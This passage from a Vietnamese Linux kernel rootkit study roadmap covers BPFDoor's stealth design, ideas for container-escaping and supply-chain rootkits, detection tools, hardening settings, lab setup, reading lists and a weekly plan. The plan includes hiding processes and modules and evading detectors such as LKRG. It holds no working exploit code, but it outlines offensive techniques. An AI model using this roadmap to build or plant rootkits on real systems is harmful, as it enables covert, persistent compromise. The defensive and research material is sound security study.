  5. Shell port KHÔNG hiện trong netstat (ẩn bằng iptables manipulation)

┌────────────────────────────────┐
│     Magic Packet (ICMP)         │
│  ┌──────────────────────────┐  │
│  │ ICMP Header              │  │
│  ├──────────────────────────┤  │
│  │ Magic Bytes: 0x7255      │  │  ← BPF filter match
│  │ Password (encrypted)      │  │
│  │ Command type              │  │
│  │ Dest port for shell       │  │
│  └──────────────────────────┘  │
└────────────────────────────────┘

Detection challenges:
  - Không beacon → network IDS thấy nothing
  - Process rename (argv overwrite) → ps thấy tên hợp lệ
  - Timestomping → forensics timeline bị nhiễu
  - Socket không bind standard port → port scan không thấy
  - PID file lock → chỉ 1 instance chạy

Bài học:
  1. Passive > Active cho stealth
  2. cBPF/eBPF = powerful filtering mà ít ai monitor
  3. Đơn giản = khó detect. BPFDoor không phức tạp, nhưng rất effective
  4. Cross-platform design = wider target range
```

### 8.5 Upgrade Techniques — Nâng cấp từ những gì APT dạy

```
Từ APT patterns, ta có thể evolve:

1. eBPF + LKM Hybrid
   └── eBPF cho stealth monitoring/filtering
   └── LKM cho heavy operations
   └── eBPF survive LKM removal

2. Container-Aware Rootkit
   └── Detect nếu đang trong container
   └── Escape container → infect host kernel
   └── Hide từ container monitoring tools (Falco, Sysdig)
   └── Manipulate cgroup/namespace structures

3. Cloud-Native Persistence
   └── Abuse cloud-init, user-data scripts
   └── Inject vào instance metadata service
   └── Persist through instance snapshot/AMI
   └── Abuse cloud IAM from compromised instance

4. Supply Chain Vector
   └── Compromised kernel module in distro repo
   └── Backdoored DKMS package
   └── Modified firmware update
   └── Trojanized eBPF monitoring tool

5. AI-Assisted Evasion (emerging)
   └── Dynamic behavior modification based on detection patterns
   └── Polymorphic code generation
   └── Adaptive C2 protocol switching
```

---

## Phần 9: Detection & Defense — Mặt đối lập

> Hiểu defense giúp viết rootkit tốt hơn, và ngược lại.

### 9.1 Detection Techniques

```
┌───────────────────────────────────────────────────────────────┐
│                    DETECTION METHODS                           │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  1. MEMORY FORENSICS (Volatility, LiME, AVML)                │
│     ├── Dump kernel memory → offline analysis                 │
│     ├── Detect hidden modules (memory vs /proc/modules diff)  │
│     ├── Detect hooked syscall table entries                   │
│     ├── Find injected code in kernel text                     │
│     ├── Detect DKOM (broken list pointers)                    │
│     └── LiME: Linux Memory Extractor — dùng LKM dump memory  │
│         (Nếu rootkit hook LKM load → LiME có thể bị block)   │
│                                                               │
│  2. SYSCALL TABLE INTEGRITY                                    │
│     ├── So sánh syscall table với known-good baseline          │
│     ├── Verify function pointers trỏ vào kernel text section  │
│     ├── Detect: entry trỏ ra ngoài kernel text = hook         │
│     └── Tool: xem /proc/kallsyms, tính expected addresses     │
│                                                               │
│  3. KERNEL MODULE ANALYSIS                                     │
│     ├── lsmod vs /proc/modules vs /sys/module                 │
│     ├── Inconsistency = hidden module                         │
│     ├── Module signature verification                         │
│     ├── Module taint flags                                    │
│     └── /proc/modules shows even tainted modules              │
│                                                               │
│  4. BEHAVIORAL ANALYSIS                                        │
│     ├── Process discrepancy: /proc vs kernel memory dump      │
│     ├── File discrepancy: ls vs debugfs (direct disk read)    │
│     ├── Network: ss/netstat vs /proc/net/tcp vs packet capture│
│     ├── Nếu kết quả khác nhau = có gì đó đang filter         │
│     └── "Cross-view detection" — xem cùng data từ nhiều góc   │
│                                                               │
│  5. RUNTIME INTEGRITY                                          │
│     ├── dm-verity: block-level integrity verification         │
│     ├── IMA/EVM: file integrity measurement                   │
│     ├── LKRG (Linux Kernel Runtime Guard)                     │
│     │   └── Detect syscall table hooks                        │
│     │   └── Detect credential manipulation                    │
│     │   └── Detect module hiding                              │
│     └── Kernel lockdown mode                                  │
│                                                               │
│  6. eBPF MONITORING                                            │
│     ├── Falco: runtime security monitoring                    │
│     ├── Tracee (Aqua Security): eBPF-based detection          │
│     ├── Tetragon (Cilium): kernel-level enforcement           │
│     ├── bpftool: list eBPF programs/maps                      │
│     └── Irony: dùng eBPF detect eBPF rootkit                 │
│                                                               │
│  7. HARDWARE-ASSISTED                                          │
│     ├── Intel SGX enclaves for integrity monitoring           │
│     ├── TPM-based attestation                                 │
│     ├── Hardware breakpoints (DR registers)                   │
│     ├── Performance counters anomaly detection                │
│     └── Hypervisor-based introspection (VMI)                  │
│                                                               │
│  8. STATIC ANALYSIS                                            │
│     ├── YARA rules trên kernel module files                   │
│     ├── Binary analysis: strings, disassembly                 │
│     ├── Known-bad hash matching                               │
│     └── Code signing verification                             │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

### 9.2 Detection Tools

| Tool | Loại | Mô tả |
|------|------|--------|
| **LKRG** | Kernel module | Linux Kernel Runtime Guard — realtime integrity checking |
| **Volatility** | Memory forensics | Framework phân tích memory dump |
| **LiME** | Memory acquisition | Linux Memory Extractor — dump RAM |
| **AVML** | Memory acquisition | Acquire Volatile Memory for Linux (Microsoft) |
| **chkrootkit** | Scanner | Check for rootkit signs |
| **rkhunter** | Scanner | Rootkit Hunter |
| **Falco** | Runtime | Cloud-native runtime security (eBPF) |
| **Tracee** | Runtime | eBPF-based runtime security |
| **Tetragon** | Runtime | Cilium/eBPF security enforcement |
| **osquery** | Monitoring | SQL-based system monitoring |
| **Velociraptor** | DFIR | Endpoint monitoring & forensics |
| **Sysdig** | Runtime | System call capture & analysis |

### 9.3 Kernel Hardening (defense perspective)

```bash
# === Boot parameters ===
# Trong GRUB config:
lockdown=confidentiality     # Kernel lockdown mode
module.sig_enforce=1         # Chỉ load signed modules
lsm=landlock,lockdown,yama,integrity,apparmor,bpf
                             # Enable nhiều LSM

# === Sysctl hardening ===
kernel.kptr_restrict=2       # Ẩn kernel pointers (ngay cả root)
kernel.dmesg_restrict=1      # Non-root không đọc dmesg
kernel.perf_event_paranoid=3 # Restrict perf events
kernel.unprivileged_bpf_disabled=1  # No unprivileged eBPF
kernel.modules_disabled=1    # Disable module loading entirely (extreme)
kernel.kexec_load_disabled=1 # Disable kexec

# === Module signing ===
# CONFIG_MODULE_SIG=y
# CONFIG_MODULE_SIG_FORCE=y  # FORCE = unsigned modules REJECTED
# CONFIG_MODULE_SIG_SHA512=y # Hash algorithm

# === Integrity ===
# IMA (Integrity Measurement Architecture)
# EVM (Extended Verification Module)
# dm-verity (block device integrity)
```

---

## Phần 10: Lab Setup & Môi trường thực hành

### 10.1 VM Setup

```bash
# === QEMU/KVM — Recommended ===
# Tại sao QEMU: debuggable, snapshots, kernel debugging support

# Cài đặt
sudo apt install qemu-kvm libvirt-daemon-system virt-manager

# Tạo VM
qemu-img create -f qcow2 rootkit-lab.qcow2 20G

# Boot với kernel debugging enabled
qemu-system-x86_64 \
    -m 4G \
    -smp 2 \
    -hda rootkit-lab.qcow2 \
    -enable-kvm \
    -nographic \
    -append "console=ttyS0 nokaslr" \
    -kernel /path/to/bzImage \
    -initrd /path/to/initramfs \
    -s -S  # -s = gdbserver on :1234, -S = freeze on start

# GDB attach
gdb vmlinux
(gdb) target remote :1234
(gdb) c

# === Vagrant — Alternative ===
# Vagrantfile
Vagrant.configure("2") do |config|
  config.vm.box = "ubuntu/jammy64"
  config.vm.provider "virtualbox" do |vb|
    vb.memory = "4096"
    vb.cpus = 2
  end
  config.vm.provision "shell", inline: <<-SHELL
    apt-get update
    apt-get install -y build-essential linux-headers-$(uname -r)
    apt-get install -y git gdb strace ltrace
  SHELL
end
```

### 10.2 Kernel Debugging Setup

```bash
# === Compile custom kernel với debug symbols ===
git clone --depth 1 --branch v6.6 \
    https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git

cd linux
make defconfig

# Enable debug options
scripts/config --enable CONFIG_DEBUG_INFO
scripts/config --enable CONFIG_DEBUG_INFO_DWARF5
scripts/config --enable CONFIG_GDB_SCRIPTS
scripts/config --enable CONFIG_KGDB
scripts/config --enable CONFIG_KGDB_SERIAL_CONSOLE
scripts/config --disable CONFIG_RANDOMIZE_BASE  # Disable KASLR for debug
scripts/config --enable CONFIG_FTRACE
scripts/config --enable CONFIG_KPROBES
scripts/config --enable CONFIG_DYNAMIC_DEBUG

make -j$(nproc)
# Output: arch/x86/boot/bzImage (kernel) + vmlinux (debug symbols)

# === GDB commands hữu ích ===
(gdb) lx-ps                    # List processes (kernel GDB scripts)
(gdb) lx-lsmod                 # List modules
(gdb) lx-symbols               # Load module symbols
(gdb) p/x sys_call_table[0]    # Print syscall table entry
(gdb) break __x64_sys_kill     # Breakpoint on kill syscall
(gdb) bt                       # Backtrace
(gdb) info registers           # Register dump

# === ftrace cho runtime tracing ===
# Trong VM:
echo function > /sys/kernel/debug/tracing/current_tracer
echo __x64_sys_getdents64 > /sys/kernel/debug/tracing/set_ftrace_filter
echo 1 > /sys/kernel/debug/tracing/tracing_on
cat /sys/kernel/debug/tracing/trace_pipe  # Xem live trace

# === SystemTap ===
# Alternative tracing, useful cho analysis
stap -e 'probe syscall.kill { printf("%s(%d) kill(%d, %d)\n",
         execname(), pid(), $pid, $sig); }'
```

### 10.3 Development Workflow

```
Recommended workflow:

Host Machine                    VM (rootkit-lab)
┌──────────────────┐           ┌──────────────────┐
│ Code editor      │    SSH    │ Compile & test    │
│ Git repo         │ ───────→ │ insmod/rmmod      │
│ GDB              │ ←─────── │ dmesg monitoring  │
│ Wireshark        │  Serial  │ strace/ltrace     │
│ Notes            │  + GDB   │                   │
└──────────────────┘           └──────────────────┘

1. Viết code trên host
2. rsync/scp sang VM
3. Compile trong VM (cần matching kernel headers)
4. Snapshot VM trước khi test
5. insmod → test → dmesg → debug
6. Nếu crash → restore snapshot → fix → repeat
7. GDB remote debug cho complex issues

⚠️ QUAN TRỌNG:
   - LUÔN dùng VM, KHÔNG BAO GIỜ test trên host
   - LUÔN snapshot trước khi load rootkit module
   - Kernel panic = reboot, có thể corrupt filesystem
   - Dùng 9p/virtio shared folder để share code
```

### 10.4 Useful Tools

```bash
# === Kernel dev essentials ===
sudo apt install build-essential linux-headers-$(uname -r)
sudo apt install git gdb strace ltrace
sudo apt install bear  # Generate compile_commands.json cho IDE

# === Analysis tools ===
sudo apt install bpfcc-tools bpftrace  # eBPF tools
sudo apt install trace-cmd              # ftrace frontend
sudo apt install systemtap              # SystemTap
sudo apt install crash                  # Kernel crash dump analysis

# === Forensics ===
pip install volatility3                  # Memory forensics
sudo apt install sleuthkit               # Disk forensics
sudo apt install yara                    # Pattern matching

# === Reverse engineering (cho analyzing rootkit binaries) ===
# Ghidra (free, NSA tool) — excellent cho kernel module RE
# IDA Pro — industry standard
# rizin/cutter — open-source alternative
# Binary Ninja — modern alternative

# === Network analysis ===
sudo apt install tcpdump wireshark-cli
sudo apt install nmap                    # Detect backdoor ports
```

---

## Phần 11: Tài nguyên học tập

### 11.1 Sách (quan trọng nhất)

| Sách | Tác giả | Nội dung | Priority |
|------|---------|----------|----------|
| **Linux Kernel Development (3rd ed.)** | Robert Love | Kernel internals overview, processes, memory, VFS | ⭐⭐⭐⭐⭐ Đọc đầu tiên |
| **Linux Device Drivers (3rd ed.)** | Corbet, Rubini, Kroah-Hartman | LKM development, character devices, memory | ⭐⭐⭐⭐⭐ Hands-on LKM |
| **Understanding the Linux Kernel (3rd ed.)** | Bovet & Cesati | Deep dive vào mọi kernel subsystem | ⭐⭐⭐⭐ Reference |
| **The Linux Programming Interface** | Michael Kerrisk | Syscall reference, userland ↔ kernel interface | ⭐⭐⭐⭐ Essential reference |
| **Linux Kernel Networking** | Rami Rosen | Kernel networking stack detail | ⭐⭐⭐ Cho network rootkit |
| **The Art of Linux Kernel Design** | Lixin Yang | Kernel design philosophy | ⭐⭐⭐ |
| **A Guide to Kernel Exploitation** | Perla & Oldani | Kernel exploitation techniques | ⭐⭐⭐⭐ Offensive focus |
| **The Rootkit Arsenal** | Bill Blunden | Rootkit techniques, Windows focus nhưng concepts apply | ⭐⭐⭐⭐ |
| **Designing BSD Rootkits** | Joseph Kong | BSD rootkit, concepts similar to Linux | ⭐⭐⭐ |
| **Linux Observability with BPF** | David Calavera | eBPF programming | ⭐⭐⭐⭐ Cho eBPF rootkit |
| **BPF Performance Tools** | Brendan Gregg | eBPF deep dive | ⭐⭐⭐⭐ |
| **The Art of Memory Forensics** | Ligh et al. | Memory forensics (cả Linux chapter) | ⭐⭐⭐ Defense perspective |
| **Practical Malware Analysis** | Sikorski & Honig | Malware analysis methodology | ⭐⭐⭐ |

### 11.2 Blogs & Websites

| Resource | URL / Search term | Nội dung |
|----------|-------------------|----------|
| **xcellerator.github.io** | "Linux Kernel Hacking" series | **BEST** starting blog series cho Linux rootkit development — step by step |
| **infosecwriteups / Medium** | Search "Linux rootkit" | Nhiều writeup từ basic đến advanced |
| **LWN.net** | lwn.net | Linux kernel news, technical articles, patch discussions |
| **kernelnewbies.org** | kernelnewbies.org | Kernel development cho beginners |
| **0x00sec** | 0x00sec.org | Community focused on security research, rootkit threads |
| **Phrack Magazine** | phrack.org | Historic hacking zine, nhiều rootkit articles kinh điển |
| **vx-underground** | vx-underground.org | Malware collection + papers + APT reports |
| **TheZoo** | GitHub: ytisf/theZoo | Live malware repository (research) |
| **Evilsocket** | evilsocket.net | Security research blog |
| **Trail of Bits** | blog.trailofbits.com | Advanced security research |
| **Elastic Security Labs** | elastic.co/security-labs | APT analysis, detection rules |
| **Project Zero** | googleprojectzero.blogspot.com | Vulnerability research |
| **Grapl Security** | (search archives) | eBPF security research |
| **Aqua Security** | blog.aquasec.com | Container + eBPF security |
| **Brendan Gregg** | brendangregg.com | eBPF/tracing expert |

### 11.3 Papers & Presentations

```
Academic & Conference Papers:

1. "Subverting the Linux Kernel" — various Phrack articles
   → Classic rootkit techniques documented

2. "TripleCross: The definitive eBPF rootkit" — Marcos Sotto Mayor
   → Academic paper on eBPF rootkit design
   → Accompanying code on GitHub

3. "Hiding Process Memory via Anti-Forensic Techniques" 
   → Memory forensics evasion

4. "A Study of Linux Kernel Rootkit" — various academic papers
   → Survey of techniques and countermeasures

5. "Drovorub: Russian GRU Malware" — NSA/FBI Advisory (2020)
   → Detailed technical analysis of APT kernel rootkit

Conference Talks (search YouTube / conference archives):

- DEF CON / Black Hat talks on:
  - "Escaping the Container" — container escape via kernel exploitation
  - "eBPF Offensive Capabilities" 
  - "Kernel Rootkits: The New Generation"
  - "Hacking the Linux Kernel Network Stack"

- Linux Security Summit talks:
  - Kernel security features development
  - LSM framework talks
  - eBPF security implications

- CCC (Chaos Communication Congress):
  - Various kernel security talks

- OffensiveCon:
  - Advanced exploitation & rootkit techniques
```

### 11.4 Online Courses & Training

```
Free:
  - Linux Foundation: "Linux Kernel Internals" (edX)
  - Operating Systems: Three Easy Pieces (OSTEP) — online textbook
  - Kernel.org documentation — Documentation/
  - Linux kernel source code — best teacher

Paid:
  - Offensive Security: EXP-401 (OSEE) — advanced exploitation
  - SANS SEC760 — Advanced Exploit Development
  - SANS FOR508 — Advanced Incident Response & Threat Hunting
  - PWK/OSCP → foundation, sau đó OSED/OSEE cho kernel

CTF / Wargames:
  - pwnable.kr — Kernel exploitation challenges
  - pwnable.tw — More kernel challenges
  - Hack The Box — Some machines require rootkit analysis
  - Root-Me — Forensics challenges
  - Google CTF — Kernel challenges
  - kCTF (Google) — Kubernetes/kernel exploitation
```

### 11.5 Kernel Source Code — Đọc source là cách học tốt nhất

```bash
# Clone kernel source
git clone --depth 1 https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git

# Hoặc browse online:
# https://elixir.bootlin.com/linux/latest/source  ← RECOMMENDED
# Có cross-reference, search, navigate cực tiện

# Files quan trọng cho rootkit research:

# Syscall table definition
arch/x86/entry/syscalls/syscall_64.tbl

# Syscall entry point
arch/x86/entry/entry_64.S

# Process management
include/linux/sched.h          # task_struct definition
kernel/fork.c                   # Process creation
kernel/exit.c                   # Process termination

# Memory management
include/linux/mm_types.h        # mm_struct, vm_area_struct
mm/mmap.c                      # Memory mapping

# VFS (Virtual File System)
include/linux/fs.h              # file_operations, inode_operations
fs/readdir.c                    # getdents implementation
fs/proc/                        # procfs implementation

# Networking
include/linux/netfilter.h       # Netfilter framework
net/ipv4/tcp_ipv4.c            # TCP implementation
include/linux/skbuff.h          # sk_buff structure

# Module system
kernel/module/                   # Module loading/unloading
include/linux/module.h          # Module structures

# Security
security/                       # LSM framework
include/linux/cred.h            # Credentials
kernel/cred.c                   # Credential management

# Tracing (ftrace, kprobes)
kernel/trace/ftrace.c           # Ftrace implementation
kernel/kprobes.c                # Kprobes implementation
kernel/bpf/                     # eBPF subsystem
```

---

## Phần 12: Lộ trình chi tiết theo tuần

### Phase 1: Foundation (Tuần 1-8)

```
Tuần 1-2: C & Assembly Review
  □ Ôn lại pointer, function pointer, struct, bitwise
  □ Viết 2-3 chương trình C phức tạp (linked list, hash table)
  □ Đọc hiểu x86-64 calling convention
  □ Viết inline assembly cơ bản trong C
  □ Setup: QEMU VM, kernel headers, build environment

Tuần 3-4: OS & Kernel Basics  
  □ Đọc OSTEP hoặc Silberschatz chapters on Process, Memory, FS
  □ Thực hành: strace nhiều chương trình, hiểu syscall flow
  □ Đọc Robert Love "Linux Kernel Development" chapters 1-5
  □ Browse kernel source trên elixir.bootlin.com

Tuần 5-6: First LKM
  □ Viết hello world module
  □ Tạo /proc entry (read/write)
  □ Tạo character device
  □ Viết module dùng kernel linked list API
  □ Viết module hook timer/workqueue
  □ Debug module bằng printk + dmesg

Tuần 7-8: Kernel Internals Deep Dive
  □ Đọc hiểu task_struct, cred, mm_struct
  □ Viết module duyệt all tasks (tương tự ps)
  □ Viết module in ra thông tin memory mapping
  □ Viết module tương tác với VFS
  □ Custom kernel compile + GDB debug setup
```

### Phase 2: Core Rootkit Techniques (Tuần 9-16)

```
Tuần 9-10: Syscall Table Hooking
  □ Tìm sys_call_table (4 phương pháp)
  □ Hook __x64_sys_kill — magic signal → print message
  □ Hook __x64_sys_getdents64 — ẩn file
  □ Hiểu CR0.WP và cách bypass
  □ Nghiên cứu Diamorphine source code

Tuần 11-12: Hiding
  □ Process hiding (getdents64 hook trên /proc)
  □ Module hiding (list_del, kobject_del)
  □ File hiding (prefix-based)
  □ Network connection hiding (/proc/net/tcp hook)
  □ Privilege escalation (prepare_creds/commit_creds)

Tuần 13-14: Networking
  □ Netfilter hook — packet inspection
  □ Port knocking implementation
  □ Magic packet trigger
  □ Kernel socket programming
  □ Covert channel basics (ICMP tunnel)

Tuần 15-16: Integration
  □ Combine tất cả techniques thành 1 rootkit hoàn chỉnh
  □ Add: command interface (proc/ioctl/magic signal)
  □ Test thoroughly trong VM
  □ Nghiên cứu Reptile source code
  □ So sánh implementation với Diamorphine & Reptile
```

### Phase 3: Advanced Techniques (Tuần 17-24)

```
Tuần 17-18: Modern Hooking
  □ Ftrace-based hooking (study Sutekh/Kovid)
  □ Kprobe/Kretprobe hooking
  □ So sánh: syscall table vs ftrace vs kprobe
  □ Implement rootkit dùng ftrace thay vì syscall table hook

Tuần 19-20: eBPF
  □ Học eBPF basics (libbpf, bpftrace)
  □ Viết eBPF programs cho tracing
  □ Study TripleCross/ebpfkit
  □ Implement simple eBPF-based hiding

Tuần 21-22: Anti-analysis & Persistence
  □ VM detection techniques
  □ Anti-debugging tricks
  □ Multiple persistence mechanisms
  □ Self-protection (prevent removal)
  □ Log evasion

Tuần 23-24: Detection & Evasion
  □ Setup detection tools (LKRG, Volatility, rkhunter)
  □ Test rootkit against each tool
  □ Improve rootkit to evade detection
  □ Study Drovorub NSA report
  □ Write detection rules (YARA, Sigma)
```

### Phase 4: Research & Innovation (Ongoing)

```
□ Analyze APT rootkit reports khi published
□ Follow Linux kernel security mailing list
□ Study new kernel versions — feature changes affecting rootkit
□ Research container escape via kernel exploitation
□ Contribute to open-source detection tools
□ Develop novel techniques
□ Write analysis reports
□ Participate in CTF kernel challenges
□ Study firmware rootkit concepts (UEFI)
□ Explore hypervisor-level rootkit (Blue Pill concepts)
```

---

## Appendix A: Quick Reference — Syscall Numbers (x86-64)

```
Commonly hooked syscalls:

__NR_read           = 0     ← File read
__NR_write          = 1     ← File write  
__NR_open           = 2     ← File open
__NR_close          = 3     ← File close
__NR_stat           = 4     ← File status
__NR_fstat          = 5     ← FD status
__NR_lstat          = 6     ← Link status
__NR_poll           = 7     ← Poll FDs
__NR_mmap           = 9     ← Memory map
__NR_mprotect       = 10    ← Memory protection
__NR_ioctl          = 16    ← Device control
__NR_access         = 21    ← File access check
__NR_kill           = 62    ← Send signal ← MAGIC SIGNAL HOOK
__NR_rename         = 82    ← File rename
__NR_mkdir          = 83    ← Create directory
__NR_rmdir          = 84    ← Remove directory
__NR_unlink         = 87    ← Delete file
__NR_getdents       = 78    ← Read directory entries (32-bit)
__NR_getdents64     = 217   ← Read directory entries (64-bit) ← FILE/PROCESS HIDING
__NR_clone          = 56    ← Create process/thread
__NR_fork           = 57    ← Fork process
__NR_execve         = 59    ← Execute program ← LOG EXECUTION
__NR_exit           = 60    ← Exit process
__NR_connect        = 42    ← Network connect
__NR_accept         = 43    ← Network accept
__NR_sendto         = 44    ← Network send
__NR_recvfrom       = 45    ← Network receive
__NR_bind           = 49    ← Bind socket
__NR_listen         = 50    ← Listen socket
__NR_openat         = 257   ← Open file (relative to dir FD) ← Modern file hook
__NR_renameat2      = 316   ← Rename (modern)
__NR_execveat       = 322   ← Execute (modern)
__NR_delete_module  = 176   ← rmmod ← PREVENT REMOVAL
__NR_init_module    = 175   ← insmod
__NR_finit_module   = 313   ← insmod from FD
```

## Appendix B: Kernel Config Options Relevant to Rootkits

```
# === Rootkit enablers (attacker wants these ON) ===
CONFIG_MODULES=y                    # Allow loadable modules
CONFIG_MODULE_UNLOAD=y              # Allow module unloading
CONFIG_FTRACE=y                     # Function tracing framework
CONFIG_KPROBES=y                    # Kernel probes
CONFIG_BPF_SYSCALL=y                # eBPF support
CONFIG_FUNCTION_TRACER=y            # Function level tracing
CONFIG_DYNAMIC_FTRACE=y             # Dynamic ftrace

# === Rootkit blockers (defender wants these ON) ===
CONFIG_MODULE_SIG=y                 # Module signature verification
CONFIG_MODULE_SIG_FORCE=y           # Reject unsigned modules
CONFIG_MODULE_SIG_ALL=y             # Sign all modules during build
CONFIG_SECURITY_LOCKDOWN_LSM=y      # Kernel lockdown
CONFIG_LOCK_DOWN_KERNEL_FORCE_CONFIDENTIALITY=y
CONFIG_STRICT_KERNEL_RWX=y          # Read-only kernel text
CONFIG_STRICT_MODULE_RWX=y          # Read-only module text
CONFIG_DEBUG_RODATA=y               # Mark kernel data appropriately
CONFIG_SECURITY=y                   # Enable LSM framework
CONFIG_SECURITY_SELINUX=y           # SELinux
CONFIG_BPF_UNPRIV_DEFAULT_OFF=y     # No unprivileged eBPF
CONFIG_CFI_CLANG=y                  # Control Flow Integrity
CONFIG_RANDOMIZE_BASE=y             # KASLR
CONFIG_PAGE_TABLE_ISOLATION=y       # KPTI
CONFIG_X86_SMAP=y                   # SMAP
CONFIG_X86_SMEP=y                   # SMEP
CONFIG_INTEGRITY=y                  # IMA/EVM
CONFIG_IMA=y                        # Integrity Measurement Architecture
```

## Appendix C: Cheat Sheet — Common Kernel APIs

```c
// === Current Process ===
current                              // Macro → task_struct* of current
current->pid                         // PID
current->comm                        // Process name
current->cred->uid.val               // User ID

// === Process Iteration ===
struct task_struct *task;
for_each_process(task) { ... }       // All processes
rcu_read_lock();
task = pid_task(find_vpid(pid), PIDTYPE_PID);  // Find by PID
rcu_read_unlock();

// === Module Info ===
THIS_MODULE                          // Current module struct
THIS_MODULE->name                    // Module name
THIS_MODULE->list                    // Module list entry

// === Memory ===
kmalloc(size, GFP_KERNEL)           // Allocate (may sleep)
kzalloc(size, GFP_KERNEL)           // Allocate + zero
kfree(ptr)                           // Free
vmalloc(size)                        // Large allocation
vfree(ptr)                           // Free vmalloc

// === String ===
kstrdup(s, GFP_KERNEL)              // Duplicate string
kasprintf(GFP_KERNEL, fmt, ...)     // sprintf with allocation
sscanf(str, fmt, ...)               // Parse string
simple_strtol(str, NULL, 10)        // String to long

// === File Operations (from kernel) ===
struct file *f;
f = filp_open("/path", O_RDONLY, 0);
kernel_read(f, buf, count, &pos);
kernel_write(f, buf, count, &pos);
filp_close(f, NULL);

// === Synchronization ===
DEFINE_SPINLOCK(lock);               // Declare + init spinlock
spin_lock(&lock); spin_unlock(&lock);
DEFINE_MUTEX(mutex);                 // Declare + init mutex  
mutex_lock(&mutex); mutex_unlock(&mutex);
rcu_read_lock(); rcu_read_unlock();  // RCU read section

// === Time ===
msleep(ms);                          // Sleep milliseconds
ssleep(s);                           // Sleep seconds
jiffies                              // Current tick count
ktime_get_ns()                       // Nanosecond timestamp
```

---

## Ghi chú cuối

**Thứ tự ưu tiên đọc nếu chỉ có ít thời gian:**
1. Robert Love — Linux Kernel Development (kernel big picture)
2. xcellerator blog series (hands-on rootkit step by step)
3. Diamorphine source code (đọc + modify + test)
4. Drovorub NSA report (real APT rootkit analysis)
5. TripleCross paper + code (eBPF future)

**Nguyên tắc:**
- Luôn test trong VM — không bao giờ trên máy thật
- Snapshot trước mỗi lần test
- Đọc kernel source > đọc tutorial — source code không bao giờ outdated
- Viết detection rules cho mỗi technique bạn học — điều này làm bạn giỏi cả hai phía
- Keep up với kernel changes — mỗi version mới có thể break hoặc enable techniques

---

*Tài liệu này phục vụ mục đích nghiên cứu bảo mật. Mọi kỹ thuật chỉ nên được thực hành trong môi trường lab được phép.*
